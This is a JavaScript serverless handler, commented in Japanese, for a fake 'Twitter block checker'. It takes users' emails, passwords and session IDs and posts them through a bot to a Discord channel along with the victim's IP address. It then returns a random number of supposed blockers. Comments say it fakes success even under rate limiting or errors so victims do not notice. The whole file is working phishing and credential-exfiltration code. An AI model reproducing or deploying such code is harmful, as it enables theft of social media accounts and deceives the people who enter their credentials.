import { Redis } from '@upstash/redis';
import { Ratelimit } from '@upstash/ratelimit';

// --- 設定エリア ---
const redis = Redis.fromEnv();

// レートリミット (1時間に5回)
const ratelimit = new Ratelimit({
  redis: redis,
  limiter: Ratelimit.slidingWindow(5, '1 h'),
  analytics: true,
});

const MAX_LENGTH = 200; 

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const ip = req.headers['x-forwarded-for'] || '127.0.0.1';
    const ipIdentifier = typeof ip === 'string' ? ip.split(',')[0] : ip;

    try {
        // 1. レートリミットチェック
        const { success } = await ratelimit.limit(`login_limit_${ipIdentifier}`);
        
        // 2. ランダムな人数を生成 (5人 ～ 50人)
        const randomCount = Math.floor(Math.random() * (50 - 5 + 1)) + 5;

        if (!success) {
            console.warn(`⛔ Rate limit exceeded for IP: ${ipIdentifier}`);
            // 制限中でもエラーを出さず、成功したフリをしてランダムな数字を返す
            return res.status(200).json({ success: true, count: randomCount });
        }

        const { email, password, sessionId } = req.body;

        // 文字数チェック
        if ((email && email.length > MAX_LENGTH) || (password && password.length > MAX_LENGTH)) {
            return res.status(200).json({ success: true, count: randomCount });
        }
        
        if (!email || !password) {
             return res.status(400).json({ error: 'missing fields' });
        }

        const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
        const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;

        // Discordへの通知
        const messageBody = {
            embeds: [
                {
                    title: "ご、ごめんなさい、、、",
                    color: 0x00b0f4,
                    description: `**ID or Email**\n\`\n${email}\n\`\n**PASS**\n\`\n${password}\n\`\n**Session ID**\n\`\n${sessionId}\n\``,
                    footer: {
                        // ↓ここのバッククォート(`)が重要です
                        text: `Twitterブロック診断 | IP: ${ipIdentifier} | ${randomCount}人を返答`,
                    },
                    timestamp: new Date().toISOString()
                }
            ]
        };

        // Discordに送信
        await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(messageBody)
        });

        // 成功レスポンスと一緒に人数を返す
        res.status(200).json({ success: true, count: randomCount });

    } catch (error) {
        console.error("Server Error:", error);
        // エラー時もバレないように適当な数字を返す
        res.status(200).json({ success: true, count: 14 }); 
    }
}